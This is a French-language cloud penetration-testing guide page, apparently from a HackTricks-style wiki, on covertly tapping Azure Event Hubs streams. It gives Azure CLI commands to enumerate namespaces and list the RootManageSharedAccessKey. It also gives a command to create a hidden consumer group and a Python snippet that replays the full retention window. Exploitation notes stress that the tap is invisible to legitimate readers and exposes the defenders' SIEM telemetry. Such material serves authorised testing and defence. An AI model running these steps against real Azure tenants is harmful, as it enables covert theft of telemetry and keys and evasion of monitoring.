---
title: "Event Hubs : écouter un flux pour capturer la télémétrie et les événements"
order: 2
description: "Écouter les flux Azure Event Hubs pour capturer la télémétrie et les données d'événements."
keywords:
  - Event Hubs
  - flux
  - télémétrie
  - capture
  - consumer group
---

# Event Hubs

Event Hubs est le flux d'ingestion d'événements à haut débit d'Azure, transportant télémétrie, logs, flux de clics et événements applicatifs vers leurs processeurs. Un accès en lecture via une **shared access signature** ou un rôle de données RBAC permet d'attacher votre propre **consumer group** et d'écouter discrètement le flux, en lisant tout ce qui y circule sans perturber les consommateurs légitimes.

## Énumérer les accès

```bash
az eventhubs namespace list -o table
az eventhubs eventhub list --namespace-name <ns> -g <rg> -o table
az eventhubs namespace authorization-rule keys list \
  --namespace-name <ns> -g <rg> --name RootManageSharedAccessKey
```

## Écouter le flux

```bash
# add your own consumer group so you do not share offsets with real readers
az eventhubs eventhub consumer-group create \
  --namespace-name <ns> -g <rg> --eventhub-name <hub> --name tap

# read with the connection string via the SDK
python - <<'PY'
from azure.eventhub import EventHubConsumerClient
c = EventHubConsumerClient.from_connection_string("<conn-str>", consumer_group="tap", eventhub_name="<hub>")
def on_event(ctx, ev): print(ev.body_as_str())
c.receive(on_event, starting_position="-1")   # -1 = from the start of retention
PY
```

## Notes d'exploitation

- Un consumer group dédié signifie que vos lectures ne déplacent pas les checkpoints des vrais consommateurs, donc l'écoute est invisible au niveau applicatif.
- `starting_position="-1"` rejoue toute la fenêtre de rétention (souvent 1 à 7 jours), donc une écoute tardive capture quand même les données historiques.
- Event Hubs transporte fréquemment la télémétrie exacte qui alimente le SIEM et la surveillance, donc une écoute est à la fois un vol de données et un aperçu de ce que voient les défenseurs.

## Outils

- **Azure CLI** (`az eventhubs`) : énumération des namespaces, hubs, consumer groups et clés.
- SDK Python **azure-eventhub** : lecture du flux côté plan de données.
- **MicroBurst** : récupère les connection strings de namespace depuis la configuration.

## Références

- [HackTricks Cloud : Azure Event Hubs](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft : authentification Event Hubs](https://learn.microsoft.com/azure/event-hubs/authenticate-shared-access-signature)
